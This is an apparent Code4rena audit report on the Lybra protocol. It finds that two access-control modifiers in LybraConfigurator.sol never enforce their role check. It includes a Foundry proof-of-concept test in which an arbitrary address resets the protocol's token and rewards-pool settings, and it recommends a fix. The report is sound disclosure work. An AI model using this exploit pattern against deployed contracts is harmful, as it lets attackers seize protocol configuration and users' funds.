## Tags

- bug
- 3 (High Risk)
- high quality report
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-03

# [Incorrectly implemented modifiers in LybraConfigurator.sol allow any address to call functions that are supposed to be restricted](https://github.com/code-423n4/2023-06-lybra-findings/issues/704) 

# Lines of code

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/configuration/LybraConfigurator.sol#L85-L93


# Vulnerability details

## Impact
The modifiers onlyRole(bytes32 role) and checkRole(bytes32 role) are not implemented correctly. This would allow anybody to call sensitive functions that should be restricted.

## Proof of Concept
For the POC, I set up a new foundry projects, and copied the folders lybra, mocks and OFT in the src folder of the new project. I installed the dependencies and then I created a file POCs.t.sol in the test folder. Here is the code that shows than a random address can call sensitive functions that should be restricted:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/lybra/configuration/LybraConfigurator.sol";
import "../src/lybra/governance/GovernanceTimelock.sol";
import "../src/lybra/miner/esLBRBoost.sol";

contract POCsTest is Test {
    Configurator public lybraConfigurator;
    GovernanceTimelock public governance;
    esLBRBoost public boost;

    address public dao = makeAddr("dao");
    address public curvePool = makeAddr("curvePool");
    address public randomUser = makeAddr("randomUser");
    address public admin = makeAddr("admin");

    address public eusd = makeAddr("eusd");
    address public pEusd = makeAddr("pEusd");

    address proposerOne = makeAddr("proposerOne");
    address executorOne = makeAddr("executorOne");

    address[] proposers = [proposerOne];
    address[] executors = [executorOne];

    address public rewardsPool = makeAddr("rewardsPool");

    function setUp() public {
        governance = new GovernanceTimelock(10000, proposers, executors, admin);
        lybraConfigurator = new Configurator(address(governance), curvePool);
        boost = new esLBRBoost();
    }

    function testIncorrectlyImplementedModifiers() public {
        console.log("EUSD BEFORE", address(lybraConfigurator.EUSD()));
        vm.prank(randomUser);
        lybraConfigurator.initToken(eusd, pEusd);
        console.log("EUSD AFTER", address(lybraConfigurator.EUSD()));

        console.log("RewardsPool BEFORE", address(lybraConfigurator.lybraProtocolRewardsPool()));
        vm.prank(randomUser);
        lybraConfigurator.setProtocolRewardsPool(rewardsPool);
        console.log("RewardsPool AFTER", address(lybraConfigurator.lybraProtocolRewardsPool()));
    }
}
```

## Tools Used
Manual Review

## Recommended Mitigation Steps
Wrap the 2 function calls in a require statement:

In modifier onlyRole(bytes32 role), instead of GovernanceTimelock.checkOnlyRole(role, msg.sender); it should be something like require(GovernanceTimelock.checkOnlyRole(role, msg.sender), "Not Authorized").

The same goes for the checkRole(bytes32 role) modifier.


## Assessed type

Access Control